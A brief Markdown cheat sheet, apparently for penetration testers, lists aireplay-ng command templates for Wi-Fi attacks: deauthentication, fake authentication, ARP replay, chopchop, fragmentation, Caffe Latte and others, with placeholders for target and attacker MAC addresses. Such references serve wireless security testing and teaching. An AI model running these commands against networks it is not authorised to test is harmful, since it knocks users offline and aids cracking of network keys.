# Aireplay-NG

#### Deauth Attack:

```
sudo aireplay-ng -0 [jumlah] -a [bssid] -c [mac_client] [interface]
```

#### Fake Auth Attack:

```
sudo aireplay-ng -1 0 -a [bssid] -h [mac_attacker] [interface]
```

#### Interactive Attack:

```
sudo aireplay-ng -2 -b [bssid] -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 [interface]
```

#### ARP Request Replay Attack:

```
sudo aireplay-ng -3 -b [bssid] -h [mac_attacker] [interface]
```

#### Chopchop Attack:

```
sudo aireplay-ng -4 -b [bssid] -h [mac_attacker] [interface]
```

#### Fragmentation Attack:

```
sudo aireplay-ng -5 -b [bssid] -h [mac_attacker] [interface]
```

#### Caffe Latte Attack:

```
sudo aireplay-ng -6 -b [bssid] -h [mac_attacker] [interface]
```

#### Client Fragment Attack:

```
sudo aireplay-ng -7 -b [bssid] -h [mac_attacker] [interface]
```

#### Migration Mode Attack:

```
sudo aireplay-ng -8 -b [bssid] -h [mac_attacker] [interface]
```

#### Test Injection:

```
sudo aireplay-ng -9 [interface]
```
